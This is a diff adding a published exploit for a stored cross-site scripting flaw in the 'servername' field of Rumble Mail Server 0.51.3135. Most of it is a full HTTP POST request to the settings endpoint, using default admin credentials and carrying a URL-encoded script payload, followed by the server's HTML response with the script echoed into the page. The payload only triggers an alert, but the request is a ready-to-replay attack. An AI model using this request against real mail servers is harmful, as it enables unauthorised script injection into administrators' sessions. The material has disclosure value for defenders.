@@ -1,0 +1,75 @@
+# Exploit Title: Rumble Mail Server 0.51.3135 - 'servername' Stored XSS
+# Date: 2020-9-3
+# Exploit Author: Mohammed Alshehri
+# Vendor Homepage: http://rumble.sf.net/
+# Software Link:  https://sourceforge.net/projects/rumble/files/Windows%20binaries/rumble_0.51.3135-setup.exe
+# Version: Version 0.51.3135
+# Tested on: Microsoft Windows 10 Education - 10.0.17763 N/A Build 17763
+
+# Exploit:
+POST /settings:save HTTP/1.1
+Host: 127.0.0.1:2580
+Connection: keep-alive
+Content-Length: 343
+Cache-Control: max-age=0
+Authorization: Basic YWRtaW46YWRtaW4=
+Upgrade-Insecure-Requests: 1
+Origin: http://127.0.0.1:2580
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.57
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://127.0.0.1:2580/settings
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+
+save=true&runas=root&servername=%3Cscript%3Ealert%28%22xss.com%22%29%3C%2Fscript%3E&forceipv4=1&bindtoaddress=0.0.0.0&messagesizelimit=104857600&mailpath=C%3A%2FProgram+Files%2FRumble%2Fstorage&dbpath=db&radio=sqlite3&smtp=1&smtpport=25&pop3=1&pop3port=110&imap4=1&imap4port=143&deliveryattempts=5&retryinterval=360&Save+settings=Save+settings
+HTTP/1.1 302 Moved
+Location: /settings:save
+
+HTTP/1.1 200 OK
+Connection: close
+Content-Type: text/html
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="shortcut icon" href="/favicon.ico " />
+<title>RumbleLua</title>
+<link href="rumblelua2.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+<div class="header_top">
+  <div class="header_stuff">
+    RumbleLua on <script>alert(xss.com)</script><br />
+    <span class="fineprint">Rumble Mail Server v/0.51.3135 <br />
+    </span>
+
+<a href="/"><img src="/icons/computer.png" align="absmiddle" /> Server status</a>
+<a href="/domains"><img src="/icons/house.png" align="absmiddle" /> Domains & accounts</a>
+
+<a href="/users"><img src="/icons/group.png" align="absmiddle" /> RumbleLua users</a>
+<a href="/settings"><img src="/icons/report_edit.png" align="absmiddle" /> Server settings</a>
+<a href="/modules"><img src="/icons/plugin_edit.png" align="absmiddle" /> Set up modules</a>
+<a href="/systeminfo"><img src="/icons/page_white_find.png" align="absmiddle" /> System logs</a>
+<a href="/queue"><img src="/icons/clock.png" align="absmiddle" /> Mail queue</a>
+
+</div>
+</div>
+<div id="contents">
+  <h1>Server settings</h1>
+
+Saving config/rumble.conf
+</div>
+<br />
+<p align="center">
+Powered by Rumble Mail Server - [<a href="https://sourceforge.net/p/rumble/wiki/Home/">wiki</a>] [<a href="https://sourceforge.net/projects/rumble/">project home</a>]
+</p>
+</body>
+
+
+</html>
